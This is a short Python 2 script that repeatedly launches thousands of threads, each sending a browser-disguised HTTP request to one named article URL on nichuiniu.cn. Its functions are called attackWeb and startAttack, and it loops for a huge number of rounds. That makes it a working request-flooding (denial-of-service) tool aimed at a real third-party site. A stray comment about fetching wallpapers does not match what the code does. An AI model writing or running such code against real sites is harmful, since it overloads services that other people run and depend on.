# -*- coding: utf-8 -*- 
__author__ = 'Peng'
from bs4 import BeautifulSoup,Comment
import urllib2
from urllib2 import urlopen,HTTPError
import MySQLdb
import json
import datetime
import logging
import sys
import re
import time
import random
import ConfigParser
import threading
import threading
import Queue
import time
from time import ctime,sleep
#获取infinity所有壁纸

# 配置日志信息 输出到控制台
logging.basicConfig(level=logging.INFO,
                format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
                datefmt='%a, %d %b %Y %H:%M:%S',
                stream=sys.stdout)

def attackWeb():

    #创建请求头
    headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
             "Accept-Language":"zh-CN,zh;q=0.8,en;q=0.6",
             "Referer":"https://www.baidu.com/s?ie=UTF-8&wd=sina"}

    try:
        url="http://www.nichuiniu.cn/article/1499266190783"
        request = urllib2.Request(url,headers=headers)
        html = urlopen(request)

    except HTTPError as e:
        print(e)




class worker(threading.Thread):
    def __init__(self, name):
        threading.Thread.__init__(self)
        self.name = name
        self.thread_stop = False

    def run(self):
        while not self.thread_stop:
            logging.info("thread%d %s: waiting for task" %(self.ident,self.name))
            attackWeb()
            self.thread_stop = True

    def stop(self):
        self.thread_stop = True


def createThread(Tnum):
    threadList = []
    for i in range(1,Tnum):
        threadList.append(str(i))

    threads = []
    # 创建新线程
    for tName in threadList:
        thread = worker(tName)
        thread.start()
        threads.append(thread)

    # sleep(0.01)
    for t in threads:
        t.join()

def startAttack(l,Tnum):
    for i in range(1,l,Tnum):
        createThread(Tnum)

startAttack(100000000,5000)

